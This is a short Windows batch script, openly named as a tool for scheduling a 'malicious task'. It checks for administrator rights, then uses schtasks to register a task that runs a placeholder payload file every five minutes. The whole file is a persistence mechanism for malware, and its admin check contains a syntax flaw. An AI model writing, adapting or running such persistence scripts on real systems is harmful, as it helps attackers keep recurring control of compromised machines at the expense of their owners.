@echo off
Title Automating malcious task every 5 min
Color A  
::Check for Administrator Rights
net session 2>&1 
if %errorlevel% neq 0(
  Color C
  echo execute the script with Administrator mode
  pause 
  exit /b )
:: Create a task to run a malicious script every 5 minutes
schtasks /create /tn "RepeatMaliciousTask" /tr "C:\Path\to\payload.bat" /sc minute /mo 5 /f

if %errorlevel%==0 (
    echo Malicious task scheduled to run every 5 minutes.
) else (
    echo Failed to schedule the task.
)
pause
